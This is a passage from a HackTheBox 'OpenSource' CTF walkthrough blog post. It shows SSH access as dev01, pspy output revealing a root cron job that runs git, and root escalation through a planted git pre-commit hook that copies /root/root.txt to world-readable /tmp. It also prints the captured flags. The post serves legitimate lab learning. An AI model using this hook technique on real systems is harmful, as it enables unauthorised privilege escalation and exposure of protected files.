</pre></table></code></div></div><p>Now let's sign in to the host with this new private key. We now have user access, and can get the user flag.</p><h2 id="user-owned"><span class="mr-2">User owned!</span><a href="#user-owned" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/openssource]
└──╼ <span class="nv">$ssh</span> <span class="nt">-i</span> id_rsa dev01@10.10.11.164
Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
dev01@opensource:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
50a9b7e797ac653c0eff40cff4e7262d
dev01@opensource:~<span class="nv">$ </span>
</pre></table></code></div></div><p>Now for root, lets do basic enumeration, with <a href="https://github.com/carlospolop/PEASS-ng">linPEAS</a>, and also <a href="https://github.com/DominicBreuker/pspy">pspy</a></p><p>linPEAS gave us no quick and easy Priv Esc, but with pspy, we can see that a script under the root user is called that calls git in the dev01 users home directory.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>2022/05/31 10:43:01 CMD: UID=0    PID=10614  | /bin/bash /usr/local/bin/git-sync 
2022/05/31 10:43:01 CMD: UID=0    PID=10613  | /bin/sh -c /usr/local/bin/git-sync 
2022/05/31 10:43:01 CMD: UID=0    PID=10612  | /usr/sbin/CRON -f 
2022/05/31 10:43:01 CMD: UID=0    PID=10615  | git status --porcelain 
2022/05/31 10:43:01 CMD: UID=0    PID=10617  | git add . 
2022/05/31 10:43:01 CMD: UID=0    PID=10620  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2022/05/31 10:53:01 CMD: UID=0    PID=4095   | git commit -m Backup for 2022-05-31 
2022/05/31 10:43:01 CMD: UID=0    PID=10619  | git push origin main 
dev01@opensource:~$ cat /usr/local/bin/git-sync
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
</pre></table></code></div></div><p>This looks to be the way to get the root flag. How would we get this from a root script calling git?</p><p>We can look at <a href="https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/">Git Hooks</a>. We can create a pre-commit hook, that code will then be executed before git commit is even ran. Let's create our own quick script that copies the flag to /tmp. (We could create a reverse shell and then have a full shell running as root, but went the quicker route)</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>dev01@opensource:~<span class="nv">$ </span>vi /home/dev01/.git/hooks/pre-commit
<span class="c">#!/bin/bash</span>
<span class="nb">cp</span> /root/root.txt /tmp/tmp.txt
<span class="nb">chmod </span>777 /tmp/tmp.txt
</pre></table></code></div></div><p>Watch using the pspy binary for the next cronjob of this to run, and then check /tmp/tmp.txt to find the flag</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>dev01@opensource:/tmp<span class="nv">$ </span><span class="nb">cat</span> /tmp/tmp.txt 
1e98fe0be2c9197fa6c1fcb965f82b5a
dev01@opensource:/tmp<span class="nv">$ </span>
</pre></table></code></div></div><h2 id="root-owned"><span class="mr-2">Root owned!</span><a href="#root-owned" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20OpenSource%20-%20Jayden%20Lind%20-%20Portfolio&url=https%3A%2F%2Fjayden-lind.github.io%2Fposts%2Fhtb-opensource%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20-%20OpenSource%20-%20Jayden%20Lind%20-%20Portfolio&u=https%3A%2F%2Fjayden-lind.github.io%2Fposts%2Fhtb-opensource%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fjayden-lind.github.io%2Fposts%2Fhtb-opensource%2F&text=HackTheBox%20-%20OpenSource%20-%20Jayden%20Lind%20-%20Portfolio" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/taz/">Breaking 20 year old PC game copy protection</a><li><a href="/posts/htb-retired/">HackTheBox - Retired</a><li><a href="/posts/linds-zabbix/">Monitoring homelab with Zabbix</a><li><a href="/posts/linds-terraform/">Implementing Terraform with vSphere</a><li><a href="/posts/linds-kubernetes/">Moving to Kubernetes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/security/">Security</a> <a class="post-tag" href="/tags/terraform/">terraform</a> <a class="post-tag" href="/tags/zabbix/">zabbix</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-noter/"><div class="card-body"> <em class="small" data-ts="1652968800" data-df="ll" > May 20, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Noter Walkthrough</h3><div class="text-muted small"><p> Noter was an interesting box, user was easy to get, required enumerating extensively. Scanning Start off with a nmap $ nmap -sV -p- -oA 10.10.11.160 10.10.11.160 Nmap scan report for 10.10.11.16...</p></div></div></a></div><div class="card"> <a href="/posts/htb-retired/"><div class="card-body"> <em class="small" data-ts="1655820000" data-df="ll" > Jun 22, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Retired</h3><div class="text-muted small"><p> HTB - Retired walkthrough Retired box is a medium rated difficulty box, but for me personally it was a hard box. I’ve never done any sort of binary exploitation before and because of that, this ...</p></div></div></a></div><div class="card"> <a href="/posts/taz/"><div class="card-body"> <em class="small" data-ts="1679230800" data-df="ll" > Mar 20, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Breaking 20 year old PC game copy protection</h3><div class="text-muted small"><p> Introduction As a kid, I used to play Taz: Wanted on my PC, but nowadays it’s impossible to play these old games as most modern PCs don’t have a CD drive. While you can easily download no-CD crack...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-noter/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Noter Walkthrough</p></a> <a href="/posts/htb-retired/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Retired</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/security/">Security</a> <a class="post-tag" href="/tags/terraform/">terraform</a> <a class="post-tag" href="/tags/zabbix/">zabbix</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/jayden-lind">jayden-lind</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-BZK4D02L4Z"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-BZK4D02L4Z', {'cookie_expires': 0 }); }); </script>
